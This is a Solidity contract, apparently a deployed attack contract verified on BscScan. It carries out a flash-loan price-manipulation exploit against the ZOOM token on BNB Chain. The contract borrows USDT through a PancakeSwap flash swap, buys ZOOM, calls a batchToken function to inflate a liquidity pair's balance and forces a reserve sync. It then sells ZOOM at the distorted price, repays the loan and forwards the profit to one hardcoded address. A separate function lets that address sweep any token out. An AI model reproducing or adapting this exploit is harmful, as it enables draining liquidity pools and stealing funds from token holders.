/**
 *Submitted for verification at BscScan.com on 2022-09-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-16
*/

pragma solidity = 0.8.6;
interface IUniswapV2Router02 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
     function transfer(address recipient, uint256 amount) external returns (bool);
      function approve(address spender, uint256 amount) external returns (bool);

}

interface IPancakeCallee {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IUSD {
  function batchToken(address[] calldata _addr, uint256[]calldata _num, address token)external ;
 function swapTokensForExactTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts) ;
    function buy(uint256) external ;
    function sell(uint256)external ;
      function getReserves() external  view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
      function sync ()external ;
}
contract flashloan is IPancakeCallee{
   address private bnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

   address private  router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address private usdt = 0x55d398326f99059fF775485246999027B3197955;
address private swap = 0x5a9846062524631C01ec11684539623DAb1Fae58;
IERC20 Usdt =IERC20 (usdt);
address private  zoom = 0x9CE084C378B3E65A164aeba12015ef3881E0F853;
address private batch = 0x47391071824569F29381DFEaf2f1b47A4004933B;
address private fU = 0x62D51AACb079e882b1cb7877438de485Cba0dD3f;
address private pp = 0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5;
IERC20 Zoom =IERC20 (zoom);
IPancakePair LP= IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    function loan(uint256 amount) public payable{
            require(msg.sender ==0xC578d755Cd56255d3fF6E92E1B6371bA945e3984, "fuck u");
        LP.swap(amount,0,address(this),new bytes(1));//vay tiền

    }
   
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) override external{
         uint256 ba = Usdt.balanceOf(address(this));
Usdt.approve(swap,100000000000000000000000000000000000000);
 address[] memory path = new address[](2);
        path[0] = usdt;
        path[1] =swap;
        IUSD(swap).buy(ba);
        address[] memory n1 = new address[](1);
n1[0] = pp;
uint256[] memory n2 = new uint256[](1);
n2[0] = 1000000 ether;
        IUSD(batch).batchToken(n1,n2,fU);
        IUSD(pp).sync();
        uint256 baz = Zoom.balanceOf(address(this));
        Zoom.approve(swap, baz*100);
        IUSD(swap).sell(baz);


 Usdt.transfer(address(LP),(ba*10030)/10000);//tra tien
//

uint256 U= Usdt.balanceOf(address(this));
IERC20(usdt).transfer(0xC578d755Cd56255d3fF6E92E1B6371bA945e3984,U);
    }

       
  
    function jfaij( address token,uint256 amount1) external {
require(msg.sender ==0xC578d755Cd56255d3fF6E92E1B6371bA945e3984, "fuck u");
require(token !=address(this));
IERC20 strandedToken =IERC20(token);
strandedToken.transfer(0xC578d755Cd56255d3fF6E92E1B6371bA945e3984,amount1);
}
}